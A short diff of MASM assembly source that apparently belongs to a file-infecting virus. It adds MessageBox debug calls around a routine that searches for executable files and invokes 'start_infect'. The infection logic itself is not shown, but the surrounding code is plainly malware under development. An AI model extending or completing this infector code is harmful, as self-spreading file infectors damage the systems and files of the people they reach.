@@ -52,6 +52,10 @@ start_search PROC addr_win32finddata:PTR WIN32_FIND_DATA, addr_file_regex:PTR,ad
 ;    invoke MessageBoxA, NULL, addr_win32finddata_cFileName, addr msgCaption_db, MB_OK
     
     start:
+    
+    
+    invoke MessageBoxA, NULL, addr buffer_mycode_len, addr msgCaption, MB_OK
+
     invoke FindFirstFileA, addr file_regex, addr_win32finddata
     cmp eax, INVALID_HANDLE_VALUE
     je findfirstfile_failed
@@ -106,7 +110,7 @@ search_exe_loop:
    ; mov  filesize_sf, eax
    ;invoke infect_file, fileptr, filesize 
    invoke start_infect
-    
+   invoke MessageBoxA, NULL, addr msgCaption_db_1, addr msgCaption_db_1, MB_OK 
      invoke MessageBoxA, NULL, addr filebuffer, addr msgCaption_db, MB_OK
     invoke crt_fseek, filehandle_sf, 0, 2 ; SEEK_END is 2
     cmp eax, 0
